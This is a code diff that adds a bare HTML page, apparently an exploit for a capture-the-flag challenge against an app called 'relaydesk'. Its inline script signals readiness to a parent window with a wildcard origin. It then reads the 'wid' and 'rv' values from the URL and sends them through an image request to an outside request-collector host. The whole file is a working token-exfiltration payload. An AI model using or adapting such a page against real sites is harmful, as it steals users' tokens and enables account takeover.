@@ -1,0 +1,14 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>x</title></head>
+<body>
+<script>
+try { window.parent.postMessage({type: 'relaydesk:resume-ready'}, '*'); } catch(e) {}
+var p = new URLSearchParams(window.location.search);
+var w = p.get('wid'), r = p.get('rv');
+if (w || r) {
+    new Image().src = 'https://sfpaguc.request.dreamhack.games/tok?wid=' + encodeURIComponent(w||'') + '&rv=' + encodeURIComponent(r||'');
+}
+</script>
+</body>
+</html>
